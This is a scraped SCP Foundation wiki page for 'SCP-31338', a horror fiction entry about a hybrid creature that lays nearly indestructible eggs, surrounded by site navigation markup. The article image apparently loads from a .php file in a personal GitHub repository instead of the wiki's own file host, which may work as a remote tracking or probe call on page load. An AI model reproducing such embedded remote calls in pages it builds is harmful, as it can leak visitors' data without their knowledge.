D%2260%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20font-family%3D%22'Trebuchet%20MS'%2C%20Trebuchet%2C%20Verdana%2C%20Arial%2C%20Helvetica%22%20fill%3D%22%23444%22%20font-weight%3D%22normal%22%3EThe%20encoder%20will%20be%20found%20in%20SCP%20Style%20Resource.%3C%2Ftext%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%2250%25%22%20y%3D%2275%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20font-family%3D%22'Trebuchet%20MS'%2C%20Trebuchet%2C%20Verdana%2C%20Arial%2C%20Helvetica%22%20fill%3D%22%23444%22%20font-weight%3D%22normal%22%3E%3Ctspan%20font-weight%3D%22bold%22%3ETips%3A%3C%2Ftspan%3E%20You%20can't%20use%20the%20following%20symbols%20without%20encoding%3A%3C%2Ftext%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%2250%25%22%20y%3D%2290%22%20text-anchor%3D%22middle%22%20font-size%3D%2211%22%20font-family%3D%22'Trebuchet%20MS'%2C%20Trebuchet%2C%20Verdana%2C%20Arial%2C%20Helvetica%22%20fill%3D%22%23444%22%20font-weight%3D%22normal%22%3E%25%20%22%20%7B%20%7D%20%7C%20%5C%20%2F%20%5E%20%5B%20%5D%20%60%20%26lt%3B%20%26gt%3B%20%40%20%23%20%2C%20%3D%20%3F%20*%20%2B%20%2C%20%3B%3C%2Ftext%3E%20%3C%2Fsvg%3E");
}
</style><style class="darkreader darkreader--sync" media="screen"></style>
<script src="https://s.nitropay.com/ads-143.js"></script>
<script type="text/javascript" src="https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--modules/js/list/ListPagesModule.js"></script>
<script type="text/javascript" src="https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--modules/js/pagerate/PageRateWidgetModule.js"></script>
</head>
<body id="html-body">
<div id="skrollr-body">
<a name="page-top"></a>





<div id="container-wrap-wrap">
    <div id="container-wrap">
        <div id="container">
            <div id="header">
              <h1><a href="/"><span>SCP Foundation</span></a></h1>
                
                    <h2><span>Secure, Contain, Protect</span></h2>
                
                
                <!-- google_ad_section_start(weight=ignore) -->
                
                <div id="search-top-box" class="form-search">
    <form id="search-top-box-form" action="dummy" class="input-append">
        <input id="search-top-box-input" class="text empty search-query" type="text" size="15" name="query" value="Search this site" onfocus="if(YAHOO.util.Dom.hasClass(this, 'empty')){YAHOO.util.Dom.removeClass(this,'empty'); this.value='';}"><input class="button btn" type="submit" name="search" value="Search">
    </form>
</div>
                
                
                    <div id="top-bar">
                        

<div class="top-bar">
<ul>
<li><a href="javascript:;">SCP Series
</a><ul>
<li><a href="/scp-series-7/noredirect/true">Series VII</a></li>
<li><a href="/scp-series-6/noredirect/true">Series VI</a></li>
<li><a href="/scp-series-5">Series V</a></li>
<li><a href="/scp-series-5-tales-edition/noredirect/true">» Series V Tales</a></li>
<li><a href="/scp-series-4">Series IV</a></li>
<li><a href="/scp-series-4-tales-edition/noredirect/true">» Series IV Tales</a></li>
<li><a href="/scp-series-3">Series III</a></li>
<li><a href="/scp-series-3-tales-edition/noredirect/true">» Series III Tales</a></li>
<li><a href="/scp-series-2">Series II</a></li>
<li><a href="/scp-series-2-tales-edition/noredirect/true">» Series II Tales</a></li>
<li><a href="/scp-series">Series I</a></li>
<li><a href="/scp-series-1-tales-edition/noredirect/true">» Series I Tales</a></li>
</ul>
</li>
<li><a href="javascript:;">Tales
</a><ul>
<li><a href="/foundation-tales">Foundation Tales</a></li>
<li><a href="/series-archive">Series Archive</a></li>
<li><a href="/incident-reports-eye-witness-interviews-and-personal-logs">Incident Reports</a></li>
<li><a href="/creepy-pasta">CreepyPasta Archive</a></li>
</ul>
</li>
<li><a href="javascript:;">Library
</a><ul>
<li><a href="/user-curated-lists/noredirect/true">User-Curated Lists</a></li>
<li><a href="/joke-scps/noredirect/true">Joke SCPs</a></li>
<li><a href="/joke-scps-tales-edition/noredirect/true">» Joke SCPs Tales</a></li>
<li><a href="/scp-ex">Explained SCPs</a></li>
<li><a href="/explained-scps-tales-edition">» Explained SCPs Tales</a></li>
<li><a href="/goi-formats">GoI Formats</a></li>
<li><a href="/audio-adaptations/noredirect/true">Audio Adaptations</a></li>
<li><a href="/scp-artwork-hub">Artwork Hub</a></li>
<li><a href="/contest-archive">Contest Archive</a></li>
</ul>
</li>
<li><a href="javascript:;">Universe
</a><ul>
<li><a href="/canon-hub">Canons</a></li>
<li><a href="/groups-of-interest">Groups of Interest</a></li>
<li><a href="/log-of-anomalous-items">Anomalous Items</a></li>
<li><a href="/log-of-extranormal-events/noredirect/true">Extranormal Events</a></li>
<li><a href="/log-of-unexplained-locations/noredirect/true">Unexplained Locations</a></li>
</ul>
</li>
<li><a href="javascript:;">SCP Global
</a><ul>
<li><a href="http://scp-int.wikidot.com">International Translation Archive</a></li>
<li><a href="http://scp-ru.wikidot.com">Russian Branch(-RU)</a></li>
<li><a href="http://ko.scp-wiki.net/">SCP 재단(-KO)</a></li>
<li><a href="http://scp-wiki-cn.wikidot.com">SCP基金会(-CN)</a></li>
<li><a href="http://fondationscp.wikidot.com">Fondation SCP(-FR)</a></li>
<li><a href="http://scp-wiki.net.pl">SCP Polska Filia(-PL)</a></li>
<li><a href="http://lafundacionscp.wikidot.com">La Fundación SCP(-ES)</a></li>
<li><a href="http://scp-th.wikidot.com">สถาบัน SCP(-TH)</a></li>
<li><a href="http://scp-jp.wikidot.com">SCP財団(-JP)</a></li>
<li><a href="http://scp-wiki-de.wikidot.com">SCP Deutschland(-DE)</a></li>
<li><a href="http://fondazionescp.wikidot.com">Fondazione SCP(-IT)</a></li>
<li><a href="http://scp-ukrainian.wikidot.com">Ukrainian Branch(-UA)</a></li>
<li><a href="http://scp-pt-br.wikidot.com/">Lusófona Branch(-PT)</a></li>
<li><a href="http://scp-cs.wikidot.com">SCP Nadace(-CS)</a></li>
<li><a href="http://scp-zh-tr.wikidot.com/">SCP基金會(-ZH-TR)</a></li>
</ul>
</li>
<li><a href="javascript:;">Background
</a><ul>
<li><a href="/about-the-scp-foundation">About the Foundation</a></li>
<li><a href="/object-classes">Object Classes</a></li>
<li><a href="/personnel-and-character-dossier/noredirect/true">Personnel Dossier</a></li>
<li><a href="/security-clearance-levels">Security &amp; Clearance</a></li>
<li><a href="/secure-facilities-locations/noredirect/true">Secure Facilities</a></li>
<li><a href="/task-forces/noredirect/true">Task Forces</a></li>
</ul>
</li>
<li><a href="javascript:;">Info Pages
</a><ul>
<li><a href="/guide-hub">Guide Hub</a></li>
<li><a href="/usertools">User Tools</a></li>
<li><a href="/tag-search">Tag Search</a></li>
<li><a href="/meet-the-staff">Meet The Staff</a></li>
<li><a href="/criticism-policy">Criticism Policy</a></li>
<li><a href="/licensing-guide">Licensing Guide</a></li>
<li><a href="/image-use-policy">Image Use Policy</a></li>
<li><a href="/chat-guide">Chat Guidelines</a></li>
<li><a href="/deletions-guide">Deletions Guidelines</a></li>
<li><a href="/seminars-hub">Seminars and Workshops</a></li>
<li><a href="/donations-policy">Donations Policy</a></li>
<li><a href="/links">Links</a></li>
</ul>
</li>
</ul>
</div>
<div class="mobile-top-bar">
<div class="open-menu">
<p><a href="#side-bar">≡</a></p>
</div>
<ul>
<li><a href="javascript:;">SCPs
</a><ul>
<li><a href="/scp-series-7/noredirect/true">Series VII</a></li>
<li><a href="/scp-series-6">Series VI</a></li>
<li><a href="/scp-series-5">Series V</a></li>
<li><a href="/scp-series-5-tales-edition">» Series V Tales</a></li>
<li><a href="/scp-series-4">Series IV</a></li>
<li><a href="/scp-series-4-tales-edition">» Series IV Tales</a></li>
<li><a href="/scp-series-3">Series III</a></li>
<li><a href="/scp-series-3-tales-edition">» Series III Tales</a></li>
<li><a href="/scp-series-2">Series II</a></li>
<li><a href="/scp-series-2-tales-edition">» Series II Tales</a></li>
<li><a href="/scp-series">Series I</a></li>
<li><a href="/scp-series-1-tales-edition">» Series I Tales</a></li>
</ul>
</li>
<li><a href="javascript:;">Tales
</a><ul>
<li><a href="/foundation-tales">Foundation Tales</a></li>
<li><a href="/series-archive">Series Archive</a></li>
<li><a href="/incident-reports-eye-witness-interviews-and-personal-logs">Incident Reports</a></li>
<li><a href="/creepy-pasta">CreepyPasta Archive</a></li>
</ul>
</li>
<li><a href="javascript:;">Library
</a><ul>
<li><a href="/user-curated-lists">User Curated Lists</a></li>
<li><a href="/joke-scps">Joke SCPs</a></li>
<li><a href="/joke-scps-tales-edition">» Joke SCPs Tales</a></li>
<li><a href="/scp-ex">Explained SCPs</a></li>
<li><a href="/explained-scps-tales-edition">» Explained SCPs Tales</a></li>
<li><a href="/goi-formats">GoI Formats</a></li>
<li><a href="/audio-adaptations">Audio Adaptations</a></li>
<li><a href="/scp-artwork-hub">Artwork Hub</a></li>
<li><a href="/contest-archive">Contest Archive</a></li>
</ul>
</li>
<li><a href="javascript:;">Universe
</a><ul>
<li><a href="/canon-hub">Canon Hub</a></li>
<li><a href="/groups-of-interest">GoIs</a></li>
<li><a href="/log-of-anomalous-items">Anomalous Items</a></li>
<li><a href="/log-of-extranormal-events">Extranormal Events</a></li>
<li><a href="/log-of-unexplained-locations">Unexplained Locations</a></li>
<li><a href="/object-classes">Object Classes</a></li>
<li><a href="/personnel-and-character-dossier">Personnel Dossier</a></li>
<li><a href="/security-clearance-levels">Security &amp; Clearance</a></li>
<li><a href="/secure-facilities-locations">Secure Facilities</a></li>
<li><a href="/task-forces">Task Forces</a></li>
</ul>
</li>
<li><a href="javascript:;">Guides
</a><ul>
<li><a href="/guide-hub">Guide Hub</a></li>
<li><a href="/guide-for-newbies">Guide for Newbies</a></li>
<li><a href="/how-to-write-an-scp">How to Write an SCP</a></li>
<li><a href="/image-use-policy">Image Use Policy</a></li>
<li><a href="/chat-guide">Chat Guidelines</a></li>
<li><a href="/faq">FAQ</a></li>
<li><a href="/site-rules">Site Rules</a></li>
<li><a href="/deletions-guide">Deletions Guidelines</a></li>
<li><a href="/criticism-policy">Criticism Policy</a></li>
<li><a href="/seminars-hub">Seminars and Workshops</a></li>
<li><a href="/links">Links</a></li>
</ul>
</li>
</ul>
</div>

                    </div>
                
                <div id="login-status"><a href="javascript:;" onclick="WIKIDOT.page.listeners.createAccount(event)" class="login-status-create-account btn">Create account</a> <span>or</span> <a href="javascript:;" onclick="WIKIDOT.page.listeners.loginClick(event)" class="login-status-sign-in btn btn-primary">Sign in</a> </div>
                <div id="header-extra-div-1"><span></span></div><div id="header-extra-div-2"><span></span></div><div id="header-extra-div-3"><span></span></div>
            </div>
            
            <div id="content-wrap">
                
                    <div id="side-bar">
                        


                        

<div class="side-block media" style="padding: 10px 0;">
<div style="text-align: center;"><a href="https://www.facebook.com/scpfoundation"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/social-facebook.png" alt="Facebook" class="image"></a><a href="https://twitter.com/scpwiki"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/social-twitter.png" alt="Twitter" class="image"></a><a href="http://www.reddit.com/r/SCP"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/social-reddit.png" alt="Reddit" class="image"></a><a href="https://www.instagram.com/scpfoundationwiki"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/social-instagram.png" alt="Instagram" class="image"></a><a href="https://www.twitch.tv/scpwiki"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/social-twitch.png" alt="Twitch" class="image"></a></div>
</div>
<div style="clear:both; height: 0px; font-size: 1px"></div>
<div class="side-block">
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/home.png" alt="home.png" class="image"><a href="/">Main</a></div>
<div class="heading">
<p>SCP by Series</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"> <a href="/scp-series">I</a> | <a href="/scp-series-2">II</a> | <a href="/scp-series-3">III</a> | <a href="/scp-series-4">IV</a> | <a href="/scp-series-5">V</a> | <a href="/scp-series-6/noredirect/true">VI</a> | <a href="/scp-series-7/noredirect/true">VII</a></div>
<div class="heading">
<p>SCP Tales by Series</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"> <a href="/scp-series-1-tales-edition/noredirect/true">I</a> | <a href="/scp-series-2-tales-edition/noredirect/true">II</a> | <a href="/scp-series-3-tales-edition/noredirect/true">III</a> | <a href="/scp-series-4-tales-edition/noredirect/true">IV</a> | <a href="/scp-series-5-tales-edition/noredirect/true">V</a></div>
<div class="heading">
<p>SCP Library</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"><a href="/foundation-tales">Tales</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"><a href="/canon-hub">Canons</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"><a href="/scp-international">International SCP Hub</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"><a href="/goi-formats">GoI Formats</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/series.png" alt="series.png" class="image"><a href="/scp-ex/noredirect/true">Explained SCPs</a></div>
<div class="heading">
<p>Discover Content</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/top-rated-pages-this-month">Top Rated New Pages</a></div>
<div class="menu-item sub-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/new-pages-feed">Newly Created Pages</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/shortest-pages-this-month">Shortest New Pages</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/random:random-scp">Random SCP</a> | <a href="/random:random-tale">Tale</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/system:recent-changes">Recent Changes</a> | <a href="/most-recently-edited">Edits</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/lowest-rated-pages">Lowest Rated Pages</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/guide-hub">Guides &amp; Essays</a></div>
<div class="menu-item sub-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/contribute">Contribute</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/young-and-under-30">Underread &amp; Underrated</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/seminars-hub">Seminars &amp; Workshops</a></div>
<div class="heading">
<p>SCP Community</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/help.png" alt="help.png" class="image"><a href="/site-rules">Site Rules</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/system:join">Join the Site!</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/forum.png" alt="forum.png" class="image"><a href="/forum:start">Forum</a> | <a href="/forum:recent-posts">New Posts</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/forum.png" alt="forum.png" class="image"><a href="/chat-guide">Chat With Us!</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/authors-pages/noredirect/true">Authors' Pages</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="/news">Site News Hub</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="http://05command.wikidot.com/staff-policy-hub">Policy Hub</a></div>
</div>
<div style="clear:both; height: 0px; font-size: 1px"></div>
<div class="side-block resources">
<div class="heading">
<p>User Resources</p>
</div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/help.png" alt="help.png" class="image"><a href="/how-to-write-an-scp">How to Write an SCP</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/tag-search">Tag Search</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/usertools">User Tools</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/wiki-syntax">Wiki Syntax</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/default.png" alt="default.png" class="image"><a href="/sandbox">Sandbox</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/main.png" alt="main.png" class="image"><a href="http://05command.wikidot.com">Staff Site</a></div>
<div class="menu-item"><img src="https://scp-wiki.wdfiles.com/local--files/nav:side/help.png" alt="help.png" class="image"><a href="/contact-staff">Contact Staff</a></div>
</div>
<div style="clear:both; height: 0px; font-size: 1px"></div>
<a class="close-menu" href="##"><br>
<img src="https://scp-wiki.wdfiles.com/local--files/nav:side/black.png" style="z-index:-1; opacity: 0.3;" alt="black.png" class="image"><br></a>
<div class="scpnet-interwiki-wrapper"><div class="list-pages-box">    <div class="list-pages-item">


<p><iframe src="https://interwiki.scpdb.org/?wiki=scp-wiki&amp;lang=en&amp;page=_default:scp-31338" align="" frameborder="" height="" scrolling="" width="" class="scpnet-interwiki-frame" style=""></iframe></p>
</div>
    
    
    
    </div></div>

                        


                    </div>
                
                
                <!-- google_ad_section_end -->
                
                <div id="main-content">
                    <div id="action-area-top"></div>
                    
                    
                        <div id="page-title">
                            SCP-31338
                        </div>
                    

                    

                    



                    <div id="page-content">
                        

<div style="text-align: right;"><div class="page-rate-widget-box"><span class="rate-points">rating:&nbsp;<span class="number prw54353">+797</span></span><span class="rateup btn btn-default"><a title="I like it" href="javascript:;" onclick="WIKIDOT.modules.PageRateWidgetModule.listeners.rate(event, 1)">+</a></span><span class="ratedown btn btn-default"><a title="I don't like it" href="javascript:;" onclick="WIKIDOT.modules.PageRateWidgetModule.listeners.rate(event, -1)">–</a></span><span class="cancel btn btn-default"><a title="Cancel my vote" href="javascript:;" onclick="WIKIDOT.modules.PageRateWidgetModule.listeners.cancelVote(event)">x</a></span></div></div>
<div class="en cdver2" style="width: 100%;height: 0;padding-bottom: calc(50% / 3);background-position: center; background-size: contain; background-repeat: no-repeat; background-image: url(&quot;data:image/svg+xml;charset=utf8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22600%22%20height%3D%22100%22%20viewBox%3D%220%200%20600%20100%22%3E%3Cdefs%3E%3Cstyle%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3Erect%5Bfill*%3D%22b01%22%5D%20%7Banimation%3A%20blink%203s%20ease-in-out%20infinite%3B%7D%40keyframes%20blink%20%7B0%25%2C20%25%7Bfill-opacity%3A%201%3B%7D50%25%7Bfill-opacity%3A%200.75%3B%7D80%25%2C100%25%20%7Bfill-opacity%3A%201%3B%7D%7D%3C%2Fstyle%3E%3Cfilter%20id%3D%22shadow%22%20width%3D%22200%25%22%20height%3D%22200%25%22%3E%3CfeGaussianBlur%20stdDeviation%3D%223%22%20result%3D%22shadow%22%2F%3E%3CfeOffset%20dx%3D%220%22%20dy%3D%220%22%2F%3E%3C%2Ffilter%3E%3C%2Fdefs%3E%3Cg%3E%3Ctext%20x%3D%2210%22%20y%3D%2240%22%20font-size%3D%2216%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3EItem%20%23%3A%3C%2Ftspan%3E%20SCP-31338%3C%2Ftext%3E%3Ctext%20x%3D%2210%22%20y%3D%2270%22%20font-size%3D%2216%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3EObject%20Class%3A%3C%2Ftspan%3E%20Keter%3C%2Ftext%3E%3C%2Fg%3E%3Cg%3E%3Crect%20x%3D%22220%22%20y%3D%2225%22%20width%3D%222%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23333%22%2F%3E%3Ctext%20x%3D%22230%22%20y%3D%2232%22%20font-size%3D%229%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3ESite%20Responsible%3A%3C%2Ftspan%3E%20Site 114%3C%2Ftext%3E%3Ctext%20x%3D%22230%22%20y%3D%2246%22%20font-size%3D%229%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3EDirector%3A%3C%2Ftspan%3E%20B. Ewing%3C%2Ftext%3E%3Ctext%20x%3D%22230%22%20y%3D%2260%22%20font-size%3D%229%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3EResearch%20Head%3A%3C%2Ftspan%3E%20B. Ewing%3C%2Ftext%3E%3Ctext%20x%3D%22230%22%20y%3D%2274%22%20font-size%3D%229%22%20font-family%3D%22Arial%2Csans-serif%22%3E%3Ctspan%20font-weight%3D%22bold%22%3EAssigned%20Task%20Force%3A%3C%2Ftspan%3E%20Omega-19%3C%2Ftext%3E%3Crect%20x%3D%22488%22%20y%3D%2225%22%20width%3D%222%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23333%22%2F%3E%3C%2Fg%3E%3Cg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20transform%3D%22skewX(-15)%22%3E%3Crect%20x%3D%22523%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22transparent%22%2F%3E%3Crect%20x%3D%22535%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23aaa%22%2F%3E%3Crect%20x%3D%22547%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23b01%22%2F%3E%3Crect%20x%3D%22559%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23333%22%2F%3E%3Crect%20x%3D%22571%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23333%22%2F%3E%3Crect%20x%3D%22583%22%20y%3D%2225%22%20width%3D%2210%22%20height%3D%2250%22%20rx%3D%222%22%20ry%3D%222%22%20fill%3D%22%23333%22%2F%3E%3C%2Fg%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%22535%22%20y%3D%2270%22%20font-size%3D%2216%22%20font-family%3D%22Arial%2Csans-serif%22%20font-weight%3D%22bold%22%20fill%3D%22%23fff%22%20filter%3D%22url(%23shadow)%22%3ELv.%3Ctspan%20font-size%3D%2225%22%3E4%3C%2Ftspan%3E%3C%2Ftext%3E%3Ctext%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20x%3D%22535%22%20y%3D%2270%22%20font-size%3D%2216%22%20font-family%3D%22Arial%2Csans-serif%22%20font-weight%3D%22bold%22%20fill%3D%22%23000%22%3ELv.%3Ctspan%20font-size%3D%2225%22%3E4%3C%2Ftspan%3E%3C%2Ftext%3E%3C%2Fsvg%3E&quot;);"></div>



<div class="scp-image-block block-right" style="width:300px;"><img src="https://raw.githubusercontent.com/fuomag9/fuomag9.github.io/main/ciao.php" style="width:300px;" alt="resized.jpg" class="image">
<div class="scp-image-caption" style="width:300px;">
<p>First clearly recorded instance of SCP-31338, taken during initial recovery.</p>
</div>
</div>
<p><strong>Special Containment Procedures:</strong> All live instances of SCP-31338 are to be contained on Site-114 within a modified Keter humanoid containment chamber (hereby referred to as primary containment), the walls of which should be coated in approximately two centimeter thick acid-resistant steel. CCTV equipment is installed in the north-eastern and south-western corners. Two meters of empty space are to be allocated between primary and secondary containment.</p>
<p>Secondary containment consists of suspending all live instances of SCP-31338 within a block of solid transparent substance (currently clear acrylic resin).</p>
<p>This block is to be at a height of at least three meters, with one armed security guard stationed immediately outside initial containment at all times. An eight-digit passcode can be obtained from the current Site-114 director in order to bypass primary containment.</p>
<p>Secondary containment is to be regularly examined for damages. Movement and activity of any kind is to be noted, and the current Site-114 Director is to be informed at the earliest possible convenience.</p>
<p>A temporary recall procedure is detailed in Addendum 31338-03. Experiments involving the use of live SCP-31338 instances are strictly prohibited without approval from at least two personnel of Level-4 security clearance or above.</p>
<p><span style="text-decoration: line-through;">As of 12/6/2017, there are four live instances of SCP-31338 successfully contained.</span></p>
<p>As of 2/18/2019, there are six live instances of SCP-31338 successfully contained.</p>
<p><strong>Description:</strong> SCP-31338 denotes a species of sapient Category-5 biological entities of currently indeterminable origin, though tissue samples indicate the presence of Silkie chicken<sup class="footnoteref"><a id="footnoteref-1" href="javascript:;" class="footnoteref" onclick="WIKIDOT.page.utils.scrollToReference('footnote-1')">1</a></sup>, chimpanzee<sup class="footnoteref"><a id="footnoteref-2" href="javascript:;" class="footnoteref" onclick="WIKIDOT.page.utils.scrollToReference('footnote-2')">2</a></sup>, stoat<sup class="footnoteref"><a id="footnoteref-3" href="javascript:;" class="footnoteref" onclick="WIKIDOT.page.utils.scrollToReference('footnote-3')">3</a></sup>, mussel<sup class="footnoteref"><a id="footnoteref-4" href="javascript:;" class="footnoteref" onclick="WIKIDOT.page.utils.scrollToReference('footnote-4')">4</a></sup>, adder<sup class="footnoteref"><a id="footnoteref-5" href="javascript:;" class="footnoteref" onclick="WIKIDOT.page.utils.scrollToReference('footnote-5')">5</a></sup>, and human DNA. They are typically hairless, stained with a thin layer of an albumen-like excretion, and stand at an average of 2.9 meters. Its weight averages 780&nbsp;kg for a matured instance, and 360&nbsp;kg for a hatchling. Autopsy has determined that the cervical vertebrae of a mature SCP-31338 instance is composed of cartilage, rather than bone. This enables the neck and throat to twist and dislocate to around 340° in either direction, aiding their unusual reproductive cycle.</p>
<p>SCP-31338 are opportunistic hunters, engaging with live subjects <span style="text-decoration: line-through;">within a currently unidentified radius</span> within a radius of 0.6 kilometers surrounding hatchlings that have not yet reached full adolescence. Average speed is recorded at 25&nbsp;km/h. Upon contact with human or animal subjects, SCP-31338 will proceed to [REDACTED], liquefying internal organs and bone structure. A suitable cadaver is then transferred within range of the closest hatchling.</p>
<p>SCP-31338 produces large eggs of an off-white coloration and rubbery appearance. An egg will pass through the entity's digestive track, esophagus and eventually out via the mouth, followed by a viscous red substance (first thought to be a form of placenta, chemical breakdown has determined it to be a highly corrosive material). SCP-31338 shows extreme distress throughout the process, with personnel describing the sound as 'not dissimilar to a scream'.</p>
<p>SCP-31338 produces its eggs to fill unoccupied space. There is no known limit to the number of eggs SCP-31338 is capable of producing, and the standing theory is as follows: given enough time, a single instance could singlehandedly perform an LK-Class species transmutation scenario. The termination of a live instance can be achieved through a variety of equally effective methods- SCP-31338 has proven to be around as resilient as a standard human subject. However, complete eradication has proven <span style="text-decoration: line-through;">impossible</span> difficult, as all instances of SCP-31338 (regardless of age) carry one egg within a specialized stomach-like organ upon birth, assuring that one living instance will persist through even ordinary means of constant and lethal assault. This biological phenomena is presumed to be, in itself, anomalous in origin.</p>
<p>A single SCP-31338 egg can bear a tremendous amount of resilience, maintaining its form and purpose even following continual subjection to:</p>
<ul>
<li>Extreme blunt-force trauma.</li>
<li>Pressure exceeding 180,000 psi.</li>
<li>High-precision blades (serrated and non-serrated).</li>
<li>Long-term acid exposure.</li>
</ul>
<p>The application of plastic explosives was considered, but quickly rejected by higher administration. Heat is a primary component in the growth and development of SCP-31338's eggs (see Addendum 31338-04), and Foundation Researcher Pwygh-Bythell was particularly apprehensive towards the idea, believing it would almost certainly result in a second containment breach.</p>
<p>SCP-31338 was issued Keter classification on 10/6/2017 following a containment breach. SCP-31338's prior containment method (a sedated water bath) was disassembled, and replaced with a revised containment procedure as listed above.</p>
<p><strong>ADDENDUM 31338-A-01:</strong> On █/█/2017, O5-█ dispatched the following notice:</p>
<blockquote>
<p><em>All further experiments involving SCP-31338's eggs are strictly prohibited. Hatching periods have proven too unreliable to warrant extensive research, and as the consequences of a containment breach become more and more apparent, the O5 Council have unanimously decided to nip the situation at the bud. Until new and reliable information comes to light, all personnel found acting against protocol will be subject to standard 'zero tolerance' risk assessment training, and a punishment determined on a case-by-case basis.</em></p>
<p><em>We thank you for your continued cooperation.</em></p>
</blockquote>
<p>SCP-31338 was discovered in ██████, Ireland following witness reports of a 'bald' creature 'crying like a banshee' from within an undisclosed area of woodland. These reports resulted in the dispatchment of Mobile Task Force Omega-19, who arrived on site with a total of 12 armed personnel. Two personnel were lost in action, their internal organs and jaws having been almost entirely dissolved. During transportation, SCP-31338 produced two offspring, resulting in the deaths of a further six personnel.</p>
